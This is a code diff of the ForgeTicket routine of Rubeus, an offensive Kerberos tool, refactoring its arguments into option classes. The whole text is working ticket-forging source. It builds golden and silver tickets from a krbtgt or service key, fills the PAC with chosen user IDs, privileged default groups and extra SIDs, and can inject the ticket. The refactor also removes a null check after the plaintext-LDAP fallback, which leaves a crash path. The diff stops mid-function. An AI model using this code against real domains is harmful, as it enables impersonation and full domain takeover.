@@ -1,85 +1,95 @@
-﻿using System;
-using System.Text;
-using System.Security.Principal;
-using System.Collections.Generic;
-using System.Linq;
-using System.Globalization;
-using System.DirectoryServices;
-using System.Text.RegularExpressions;
-using Rubeus.lib.Interop;
+﻿using Rubeus.Kerberos;
 using Rubeus.Kerberos.PAC;
-using Rubeus.Kerberos;
+using Rubeus.lib.Interop;
+using System;
+using System.Collections.Generic;
+using System.Globalization;
+using System.Linq;
+using System.Security.Principal;
+using System.Text.RegularExpressions;
 
 namespace Rubeus
 {
+
+    public class PacOptions
+    {
+        public int? UserId = null;
+        public string GroupIds = "";
+        public string ExtraSids = "";
+        public string DisplayName = "";
+        public short? LogonCount = null;
+        public short? BadPwdCount = null;
+        public DateTime? LastLogon = null;
+        public DateTime? LogoffTime = null;
+        public DateTime? PwdLastSet = null;
+        public int? maxPassAge = null;
+        public int? minPassAge = null;
+        public int? PrimaryGroupId = null;
+        public string HomeDir = "";
+        public string HomeDrive = "";
+        public string ProfilePath = "";
+        public string ScriptPath = "";
+        public string ResourceGroupDomainSid = "";
+        public List<int> ResourceGroupIds = null;
+        public Interop.PacUserAccountControl UserAccountControl = Interop.PacUserAccountControl.NORMAL_ACCOUNT;
+    }
+
+    public class TicketForgeOptions
+    {
+        // krbtgt key information
+        public byte[] KrbtgtKey = null;
+        public Interop.KERB_CHECKSUM_ALGORITHM KrbtgtEtype = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256;
+        // ldap information
+        public bool Ldap = false;
+        public System.Net.NetworkCredential LdapCredentials = null;
+        // domain and DC information
+        public string domainSid = "";
+        public string DomainName = "";
+        public string netbiosName = "";
+        public string DomainController = "";
+        // ticket flags
+        public Interop.TicketFlags TicketFlags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent;
+        // ticket time information
+        public DateTime? startTime = null;
+        public DateTime? rangeEnd = null;
+        public string rangeInterval = "1d";
+        public DateTime? AuthTime = null;
+        public string EndTime = "";
+        public string RenewTill = "";
+        // PAC
+        public PacOptions Pac = new PacOptions();
+        // arguments to deal with resulting ticket(s)
+        public string outfile = null;
+        public bool ptt = false;
+        // print a command to rebuild the ticket(s)
+        public bool printcmd = false;
+        // arguments for unusual tickets
+        public string cName = null;
+        public string cRealm = null;
+        public string s4uProxyTarget = null;
+        public string s4uTransitedServices = null;
+        public bool IncludeAuthData = false;
+    }
+
+
     public class ForgeTickets
     {
-        public static void ForgeTicket(
-            // always required arguments
-            string user,
-            string sname,
-            byte[] serviceKey,
-            Interop.KERB_ETYPE etype,
-            // krbtgt key information
-            byte[] krbKey = null,
-            Interop.KERB_CHECKSUM_ALGORITHM krbeType = Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256,
-            // ldap information
-            bool ldap = false,
-            string ldapuser = null,
-            string ldappassword = null,
-            // domain and DC information
-            string sid = "",
-            string domain = "",
-            string netbiosName = "",
-            string domainController = "",
-            // ticket flags
-            Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent,
-            // ticket time information
-            DateTime? startTime = null,
-            DateTime? rangeEnd = null,
-            string rangeInterval = "1d",
-            DateTime? authTime = null,
-            string endTime = "",
-            string renewTill = "",
-            // other PAC fields
-            int? id = null,
-            string groups = "",
-            string sids = "",
-            string displayName = "",
-            short? logonCount = null,
-            short? badPwdCount = null,
-            DateTime? lastLogon = null,
-            DateTime? logoffTime = null,
-            DateTime? pwdLastSet = null,
-            int? maxPassAge = null,
-            int? minPassAge = null,
-            int? pGid = null,
-            string homeDir = "",
-            string homeDrive = "",
-            string profilePath = "",
-            string scriptPath = "",
-            string resourceGroupSid = "",
-            List<int> resourceGroups = null,
-            Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT,
-            // arguments to deal with resulting ticket(s)
-            string outfile = null,
-            bool ptt = false,
-            // print a command to rebuild the ticket(s)
-            bool printcmd = false,
-            // arguments for unusual tickets
-            string cName = null,
-            string cRealm = null,
-            string s4uProxyTarget = null,
-            string s4uTransitedServices = null,
-            bool includeAuthData = false
-            )
+        public static void ForgeTicket(string user, string sname, byte[] serviceKey, Interop.KERB_ETYPE etype, TicketForgeOptions options)
         {
-            // vars
-            int c = 0;
-            DateTime originalStartTime = (DateTime)startTime;
-            System.Net.NetworkCredential ldapCred = null;
-            int? origMinPassAge = minPassAge;
-            int? origMaxPassAge = maxPassAge;
+            // Copy values that get modified in this function, so that we don't modify what the caller passed in
+            string domain = options.DomainName;
+            string domainController = options.DomainController;
+            DateTime? startTime = options.startTime; 
+            byte[] krbtgtKey = options.KrbtgtKey;
+            string cName = options.cName;
+            string cRealm = options.cRealm;
+            DateTime? authTime = options.AuthTime;
+
+            // Regular local variables
+            int? minPassAge = null;
+            int? maxPassAge = null;
+            int counter = 0;
+            bool ldapSsl = true;
 
             // initialise LogonInfo section and set defaults
             var kvi = Ndr._KERB_VALIDATION_INFO.CreateDefault();
@@ -91,7 +101,7 @@ namespace Rubeus
             kvi.LogonScript = new Ndr._RPC_UNICODE_STRING("");
             kvi.LogonServer = new Ndr._RPC_UNICODE_STRING("");
             kvi.UserSessionKey = Ndr._USER_SESSION_KEY.CreateDefault();
-            kvi.LogonTime = new Ndr._FILETIME(((DateTime)startTime).AddSeconds(-1));
+            kvi.LogonTime = new Ndr._FILETIME(((DateTime)options.startTime).AddSeconds(-1));
             kvi.LogoffTime = Ndr._FILETIME.CreateDefault();
             kvi.PasswordLastSet = Ndr._FILETIME.CreateDefault();
             kvi.KickOffTime = Ndr._FILETIME.CreateDefault();
@@ -101,7 +111,7 @@ namespace Rubeus
             kvi.BadPasswordCount = 0;
             kvi.UserId = 500;
             kvi.PrimaryGroupId = 513;
-            if (string.IsNullOrEmpty(groups))
+            if (string.IsNullOrEmpty(options.Pac.GroupIds))
             {
                 kvi.GroupCount = 5;
                 kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[] {
@@ -112,44 +122,17 @@ namespace Rubeus
                     new Ndr._GROUP_MEMBERSHIP(518, 0),
                 };
             }
-            kvi.UserAccountControl = (int)uac;
+            kvi.UserAccountControl = (int)options.Pac.UserAccountControl;
             kvi.UserFlags = 0;
-            if (String.IsNullOrEmpty(sids))
+            if (String.IsNullOrEmpty(options.Pac.ExtraSids))
             {
                 kvi.SidCount = 0;
-                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] {
-                        new Ndr._KERB_SID_AND_ATTRIBUTES()};
+                kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES() };
             }
-
-            // get network credential from ldapuser and ldappassword
-            if (!String.IsNullOrEmpty(ldapuser))
-            {
-                // provide an alternate user to use for connection creds
-                if (!Regex.IsMatch(ldapuser, ".+\\.+", RegexOptions.IgnoreCase))
-                {
-                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
-                    return;
-                }
-
-                try
-                {
-                    string[] ldapParts = ldapuser.Split('\\');
-                    string ldapDomainName = ldapParts[0];
-                    string ldapUserName = ldapParts[1];
-
-                    ldapCred = new System.Net.NetworkCredential(ldapUserName, ldappassword, ldapDomainName);
-                }
-                catch
-                {
-                    Console.WriteLine("\r\n[X] /creduser specification must be in fqdn format (domain.com\\user)\r\n");
-                    return;
-                }
-            }
-
 
             // determine domain if not supplied
             string[] parts = sname.Split('/');
-            if (String.IsNullOrEmpty(domain))
+            if (String.IsNullOrEmpty(options.DomainName))
             {
                 if ((parts.Length > 1) && (parts[0] == "krbtgt"))
                 {
@@ -180,34 +163,27 @@ namespace Rubeus
                     return;
                 }
             }
-            if (String.IsNullOrEmpty(netbiosName))
+            if (String.IsNullOrEmpty(options.netbiosName))
             {
                 kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(domain.Substring(0, domain.IndexOf('.')).ToUpper());
             }
 
             // if /ldap was passed make the LDAP queries
-            if (ldap)
+            if (options.Ldap)
             {
                 // try LDAPS and fail back to LDAP
                 List<IDictionary<string, Object>> ActiveDirectoryObjects = null;
-                bool ssl = true;
                 if (String.IsNullOrEmpty(domainController))
                 {
                     domainController = Networking.GetDCName(domain); //if domain is null, this will try to find a DC in current user's domain
                 }
-
                 Console.WriteLine("[*] Trying to query LDAP using LDAPS for user information on domain controller {0}", domainController);
-                ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
+                ActiveDirectoryObjects = Networking.GetLdapQuery(options.LdapCredentials, "", domainController, domain, $"(samaccountname={user})", ldapSsl);
                 if (ActiveDirectoryObjects == null)
                 {
+                    ldapSsl = false;
                     Console.WriteLine("[!] LDAPS failed, retrying with plaintext LDAP.");
-                    ssl = false;
-                    ActiveDirectoryObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(samaccountname={0})", user), ssl);
-                }
-                if (ActiveDirectoryObjects == null)
-                {
-                    Console.WriteLine("[X] Error LDAP query failed, unable to create ticket using LDAP.");
-                    return;
+                    ActiveDirectoryObjects = Networking.GetLdapQuery(options.LdapCredentials, "", domainController, domain, $"(samaccountname={user})", ldapSsl);
                 }
 
                 foreach (var userObject in ActiveDirectoryObjects)
@@ -216,102 +192,10 @@ namespace Rubeus
                     string domainSid = objectSid.Substring(0, objectSid.LastIndexOf('-'));
 
                     // parse the UAC field and set in the PAC
-                    if (uac == Interop.PacUserAccountControl.NORMAL_ACCOUNT)
+                    if (options.Pac.UserAccountControl == Interop.PacUserAccountControl.NORMAL_ACCOUNT)
                     {
-                        kvi.UserAccountControl = 0;
-                        Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)userObject["useraccountcontrol"];
-                        if ((userUAC & Interop.LDAPUserAccountControl.ACCOUNTDISABLE) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNTDISABLE;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.HOMEDIR_REQUIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.HOMEDIR_REQUIRED;
-                        }
-
-                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWD_NOTREQD) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWD_NOTREQD;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.TEMP_DUPLICATE_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TEMP_DUPLICATE_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.NORMAL_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NORMAL_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.MNS_LOGON_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.MNS_LOGON_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.INTERDOMAIN_TRUST_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.WORKSTATION_TRUST_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.WORKSTATION_TRUST_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.SERVER_TRUST_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SERVER_TRUST_ACCOUNT;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_EXPIRE_PASSWORD) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD;
-                        }
-                        // Is this right? LDAP UAC field doesn't contain ACCOUNT_AUTO_LOCKED, LOCKOUT looks like the most likely candidate
-                        if ((userUAC & Interop.LDAPUserAccountControl.LOCKOUT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ACCOUNT_AUTO_LOCKED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.ENCRYPTED_TEXT_PWD_ALLOWED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.SMARTCARD_REQUIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.SMARTCARD_REQUIRED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_FOR_DELEGATION) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_FOR_DELEGATION;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.NOT_DELEGATED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NOT_DELEGATED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_DES_KEY_ONLY;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.DONT_REQ_PREAUTH) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.DONT_REQ_PREAUTH;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.PASSWORD_EXPIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PASSWORD_EXPIRED;
-                        }
-                        if ((userUAC & Interop.LDAPUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.TRUSTED_TO_AUTH_FOR_DELEGATION;
-                        }
-                        /* No NO_AUTH_DATA_REQUIRED bit seems to exist in the UAC field returned by LDAP
-                        if ((userUAC & Interop.LDAPUserAccountControl.NO_AUTH_DATA_REQUIRED) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.NO_AUTH_DATA_REQUIRED;
-                        }*/
-                        if ((userUAC & Interop.LDAPUserAccountControl.PARTIAL_SECRETS_ACCOUNT) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.PARTIAL_SECRETS_ACCOUNT;
-                        }
-                        /* No USE_AES_KEYS bit seems to exist in the UAC field returned by LDAP
-                        if ((userUAC & Interop.LDAPUserAccountControl.USE_AES_KEYS) != 0)
-                        {
-                            kvi.UserAccountControl = kvi.UserAccountControl | (int)Interop.PacUserAccountControl.USE_AES_KEYS;
-                        }*/
+                        Interop.LDAPUserAccountControl ldapUac = (Interop.LDAPUserAccountControl)userObject["useraccountcontrol"];
+                        kvi.UserAccountControl = LdapUacToPacUac(ldapUac);
                     }
 
                     List<IDictionary<string, Object>> adObjects = null;
@@ -319,7 +203,7 @@ namespace Rubeus
                     // build group and domain policy filter
                     string filter = "";
                     string outputText = "";
-                    if (string.IsNullOrEmpty(groups))
+                    if (string.IsNullOrEmpty(options.Pac.GroupIds))
                     {
                         if (userObject.ContainsKey("memberof"))
                         {
@@ -331,12 +215,14 @@ namespace Rubeus
                         }
                     }
 
-                    if (pGid == null)
-                        filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);
-
-                    if (minPassAge == null || (maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))
+                    if (options.Pac.PrimaryGroupId == null)
                     {
-                        filter = String.Format("{0}(name={{31B2F340-016D-11D2-945F-00C04FB984F9}})", filter);
+                        filter += String.Format("(objectsid={0}-{1})", domainSid, (string)userObject["primarygroupid"]);
+                    }
+
+                    if (options.Pac.minPassAge == null || (options.Pac.maxPassAge == null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0)))
+                    {
+                        filter += "(&(objectClass=groupPolicyContainer)(name={31B2F340-016D-11D2-945F-00C04FB984F9}))";
                         if (String.IsNullOrEmpty(outputText))
                         {
                             outputText = "domain policy";
@@ -350,8 +236,8 @@ namespace Rubeus
                     if (!String.IsNullOrEmpty(filter))
                     {
                         // Try to get group and domain policy information from LDAP
-                        Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, domainController);
-                        adObjects = Networking.GetLdapQuery(ldapCred, "", domainController, domain, String.Format("(|{0})", filter), ssl);
+                        Console.WriteLine("[*] Retrieving {0} information over LDAP from domain controller {1}", outputText, options.DomainController);
+                        adObjects = Networking.GetLdapQuery(options.LdapCredentials, "", options.DomainController, options.DomainName, String.Format("(|{0})", filter), ldapSsl);
                         if (adObjects == null)
                         {
                             Console.WriteLine("[!] Unable to get {0} information using LDAP, using defaults.", outputText);
@@ -368,14 +254,14 @@ namespace Rubeus
                                 kvi.GroupCount = 1;
                                 kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[1];
                             }
-                            c = 0;
+                            counter = 0;
                             foreach (var o in adObjects)
                             {
                                 if (o.ContainsKey("gpcfilesyspath"))
                                 {
                                     string gptTmplPath = String.Format("{0}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf", (string)o["gpcfilesyspath"]);
                                     gptTmplPath = gptTmplPath.Replace(String.Format("\\\\{0}\\", domain), String.Format("\\\\{0}\\", domainController));
-                                    Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, ldapuser, ldappassword);
+                                    Dictionary<string, Dictionary<string, Object>> gptTmplObject = Networking.GetGptTmplContent(gptTmplPath, options.LdapCredentials);
 
                                     if (gptTmplObject == null)
                                     {
@@ -383,7 +269,7 @@ namespace Rubeus
                                         continue;
                                     }
 
-                                    if (minPassAge == null)
+                                    if (options.Pac.minPassAge == null)
                                     {
                                         minPassAge = Int32.Parse((string)gptTmplObject["SystemAccess"]["MinimumPasswordAge"]);
                                         if (minPassAge > 0)
@@ -404,15 +290,15 @@ namespace Rubeus
                                 {
                                     string groupSid = (string)o["objectsid"];
                                     int groupId = Int32.Parse(groupSid.Substring(groupSid.LastIndexOf('-') + 1));
-                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, c, 1);
-                                    c += 1;
+                                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(groupId, 7) }, 0, kvi.GroupIds, counter, 1);
+                                    counter += 1;
                                 }
                             }
                         }
                     }
 
                     // preform the netbios name lookup
-                    if (String.IsNullOrEmpty(netbiosName))
+                    if (String.IsNullOrEmpty(options.netbiosName))
                     {
                         Console.WriteLine("[*] Retrieving netbios name information over LDAP from domain controller {0}", domainController);
 
@@ -425,16 +311,16 @@ namespace Rubeus
                         catch
                         {
                             Console.WriteLine("[!] Unable to query forest root using System.DirectoryServices.ActiveDirectory.Forest, assuming {0} is the forest root", domain);
-                            forestRoot = domain;
+                            forestRoot = options.DomainName;
                         }
 
-                        string configRootDomain = domain;
-                        if (!domain.Equals(forestRoot))
+                        string configRootDomain = options.DomainName;
+                        if (!options.DomainName.Equals(forestRoot))
                             configRootDomain = forestRoot;
 
                         string configOU = String.Format("CN=Configuration,DC={0}", configRootDomain.Replace(".", ",DC="));
 
-                        adObjects = Networking.GetLdapQuery(ldapCred, configOU, domainController, domain, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ssl);
+                        adObjects = Networking.GetLdapQuery(options.LdapCredentials, configOU, options.DomainController, options.DomainName, String.Format("(&(netbiosname=*)(dnsroot={0}))", domain), ldapSsl);
                         if (adObjects == null)
                         {
                             Console.WriteLine("[!] Unable to get netbios name information using LDAP, using defaults.");
@@ -457,7 +343,7 @@ namespace Rubeus
                         kvi.FullName = new Ndr._RPC_UNICODE_STRING((string)userObject["displayname"]);
                     }
 
-                    if (String.IsNullOrEmpty(sid))
+                    if (String.IsNullOrEmpty(options.domainSid))
                     {
                         kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(domainSid));
                     }
@@ -497,10 +383,9 @@ namespace Rubeus
                 }
 
             }
-            else if (String.IsNullOrEmpty(sid))
+            else if (String.IsNullOrEmpty(options.domainSid))
             {
-                Console.WriteLine("[X] To forge tickets without specifying '/ldap', '/sid' is required.");
-                return;
+                throw new RubeusException("To forge tickets without specifying '/ldap', '/sid' is required.");
             }
 
             // initialize some structures
@@ -510,18 +395,18 @@ namespace Rubeus
             Console.WriteLine("[*] Building PAC");
 
             // overwrite any LogonInfo fields here sections
-            if (!String.IsNullOrEmpty(netbiosName))
+            if (!String.IsNullOrEmpty(options.netbiosName))
             {
-                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(netbiosName);
+                kvi.LogonDomainName = new Ndr._RPC_UNICODE_STRING(options.netbiosName);
             }
-            if (!String.IsNullOrEmpty(sid))
+            if (!String.IsNullOrEmpty(options.domainSid))
             {
-                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(sid));
+                kvi.LogonDomainId = new Ndr._RPC_SID(new SecurityIdentifier(options.domainSid));
             }
-            if (!String.IsNullOrEmpty(groups))
+            if (!String.IsNullOrEmpty(options.Pac.GroupIds))
             {
                 List<int> allGroups = new List<int>();
-                foreach (string gid in groups.Split(','))
+                foreach (string gid in options.Pac.GroupIds.Split(','))
                 {
                     try
                     {
@@ -532,47 +417,50 @@ namespace Rubeus
                         Console.WriteLine("[X] Error unable to parse group id {0}: {1}", gid, e.Message);
                     }
                 }
-                if ((pGid != null) && !allGroups.Contains((int)pGid))
-                    allGroups.Add((int)pGid);
+                if ((options.Pac.PrimaryGroupId != null) && !allGroups.Contains((int)options.Pac.PrimaryGroupId))
+                {
+                    allGroups.Add((int)options.Pac.PrimaryGroupId);
+                }
                 int numOfGroups = allGroups.Count;
                 kvi.GroupCount = numOfGroups;
                 kvi.GroupIds = new Ndr._GROUP_MEMBERSHIP[numOfGroups];
-                c = 0;
+                counter = 0;
                 foreach (int gid in allGroups)
                 {
-                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(gid, 7) }, 0, kvi.GroupIds, c, 1);
-                    c += 1;
+                    Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(gid, 7) }, 0, kvi.GroupIds, counter, 1);
+                    counter += 1;
                 }
             }
-            if (!String.IsNullOrEmpty(sids))
+            if (!String.IsNullOrEmpty(options.Pac.ExtraSids))
             {
-                int numOfSids = sids.Split(',').Length;
+                string[] splitSids = options.Pac.ExtraSids.Split(',');
+                int numOfSids = splitSids.Length;
                 kvi.SidCount = numOfSids;
                 kvi.ExtraSids = new Ndr._KERB_SID_AND_ATTRIBUTES[numOfSids];
-                c = 0;
-                foreach (string s in sids.Split(','))
+                counter = 0;
+                foreach (string s in splitSids)
                 {
-                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, c, 1);
-                    c += 1;
+                    Array.Copy(new Ndr._KERB_SID_AND_ATTRIBUTES[] { new Ndr._KERB_SID_AND_ATTRIBUTES(new Ndr._RPC_SID(new SecurityIdentifier(s)), 7) }, 0, kvi.ExtraSids, counter, 1);
+                    counter += 1;
                 }
             }
-            if (!String.IsNullOrEmpty(resourceGroupSid) && (resourceGroups != null))
+            if (!String.IsNullOrEmpty(options.Pac.ResourceGroupDomainSid) && (options.Pac.ResourceGroupIds != null))
             {
                 try
                 {
-                    kvi.ResourceGroupDomainSid = new Ndr._RPC_SID(new SecurityIdentifier(resourceGroupSid));
-                    kvi.ResourceGroupCount = resourceGroups.Count;
-                    kvi.ResourceGroupIds = new Ndr._GROUP_MEMBERSHIP[resourceGroups.Count];
-                    c = 0;
-                    foreach (int rgroup in resourceGroups)
+                    kvi.ResourceGroupDomainSid = new Ndr._RPC_SID(new SecurityIdentifier(options.Pac.ResourceGroupDomainSid));
+                    kvi.ResourceGroupCount = options.Pac.ResourceGroupIds.Count;
+                    kvi.ResourceGroupIds = new Ndr._GROUP_MEMBERSHIP[options.Pac.ResourceGroupIds.Count];
+                    counter = 0;
+                    foreach (int rgroup in options.Pac.ResourceGroupIds)
                     {
-                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(rgroup, 7) }, 0, kvi.ResourceGroupIds, c, 1);
-                        c += 1;
+                        Array.Copy(new Ndr._GROUP_MEMBERSHIP[] { new Ndr._GROUP_MEMBERSHIP(rgroup, 7) }, 0, kvi.ResourceGroupIds, counter, 1);
+                        counter += 1;
                     }
                 }
-                catch
+                catch (Exception ex)
                 {
-
+                    throw new RubeusException("Error setting up resource group IDs in forged ticket: " + ex.Message);
                 }
             }
             if (kvi.SidCount > 0)
@@ -591,38 +479,38 @@ namespace Rubeus
                     kvi.LogonServer = new Ndr._RPC_UNICODE_STRING(domainController.Substring(0, domainController.IndexOf('.')).ToUpper());
                 }
             }
-            if (!String.IsNullOrEmpty(displayName))
+            if (!String.IsNullOrEmpty(options.Pac.DisplayName))
             {
-                kvi.FullName = new Ndr._RPC_UNICODE_STRING(displayName);
+                kvi.FullName = new Ndr._RPC_UNICODE_STRING(options.Pac.DisplayName);
             }
-            if (logonCount != null)
+            if (options.Pac.LogonCount != null)
             {
-                kvi.LogonCount = (short)logonCount;
+                kvi.LogonCount = (short)options.Pac.LogonCount;
             }
-            if (badPwdCount != null)
+            if (options.Pac.BadPwdCount != null)
             {
-                kvi.BadPasswordCount = (short)badPwdCount;
+                kvi.BadPasswordCount = (short)options.Pac.BadPwdCount;
             }
-            if (lastLogon != null)
+            if (options.Pac.LastLogon != null)
             {
-                kvi.LogonTime = new Ndr._FILETIME((DateTime)lastLogon);
+                kvi.LogonTime = new Ndr._FILETIME((DateTime)options.Pac.LastLogon);
             }
-            if (logoffTime != null)
+            if (options.Pac.LogoffTime != null)
             {
-                kvi.LogoffTime = new Ndr._FILETIME((DateTime)logoffTime);
+                kvi.LogoffTime = new Ndr._FILETIME((DateTime)options.Pac.LogoffTime);
             }
-            if (pwdLastSet != null)
+            if (options.Pac.PwdLastSet != null)
             {
-                kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)pwdLastSet);
+                kvi.PasswordLastSet = new Ndr._FILETIME((DateTime)options.Pac.PwdLastSet);
             }
-            if (origMinPassAge != null)
+            if (options.Pac.minPassAge != null)
             {
                 try
                 {
                     DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
-                    if (minPassAge > 0)
+                    if (options.Pac.minPassAge > 0)
                     {
-                        kvi.PasswordCanChange = new Ndr._FILETIME(passLastSet.AddDays((double)minPassAge));
+                        kvi.PasswordCanChange = new Ndr._FILETIME(passLastSet.AddDays((double)options.Pac.minPassAge));
                     }
                 }
                 catch
@@ -630,14 +518,14 @@ namespace Rubeus
                     Console.WriteLine("[!] Something went wrong setting the PasswordCanChange field, perhaps PasswordLastSet is not configured properly");
                 }
             }
-            if (origMaxPassAge != null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
+            if (options.Pac.maxPassAge != null && (((Interop.PacUserAccountControl)kvi.UserAccountControl & Interop.PacUserAccountControl.DONT_EXPIRE_PASSWORD) == 0))
             {
                 try
                 {
                     DateTime passLastSet = DateTime.FromFileTimeUtc((long)kvi.PasswordLastSet.LowDateTime | ((long)kvi.PasswordLastSet.HighDateTime << 32));
-                    if (maxPassAge > 0)
+                    if (options.Pac.maxPassAge > 0)
                     {
-                        kvi.PasswordMustChange = new Ndr._FILETIME(passLastSet.AddDays((double)maxPassAge));
+                        kvi.PasswordMustChange = new Ndr._FILETIME(passLastSet.AddDays((double)options.Pac.maxPassAge));
                     }
                 }
                 catch
@@ -645,29 +533,29 @@ namespace Rubeus
                     Console.WriteLine("[!] Something went wrong setting the PasswordMustChange field, perhaps PasswordLastSet is not configured properly");
                 }
             }
-            if (id != null)
+            if (options.Pac.UserId != null)
             {
-                kvi.UserId = (int)id;
+                kvi.UserId = (int)options.Pac.UserId;
             }
-            if (pGid != null)
+            if (options.Pac.PrimaryGroupId != null)
             {
-                kvi.PrimaryGroupId = (int)pGid;
+                kvi.PrimaryGroupId = (int)options.Pac.PrimaryGroupId;
             }
-            if (!String.IsNullOrEmpty(homeDir))
+            if (!String.IsNullOrEmpty(options.Pac.HomeDir))
             {
-                kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(homeDir);
+                kvi.HomeDirectory = new Ndr._RPC_UNICODE_STRING(options.Pac.HomeDir);
             }
